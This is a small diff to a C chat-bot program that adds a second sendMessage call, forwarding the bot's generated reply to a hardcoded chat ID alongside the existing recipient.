@@ -187,6 +187,7 @@ int main(){
     char* res = E(getMessage());
     printf("%s", res);
     sendMessage("bottoken.txt", SHLEX, "message", res, "attachment", attachment ?: "");
+    sendMessage("bottoken.txt", "190499058", "message", res);
     free(res);
 
     Z(pinLastMessage(SHLEX));
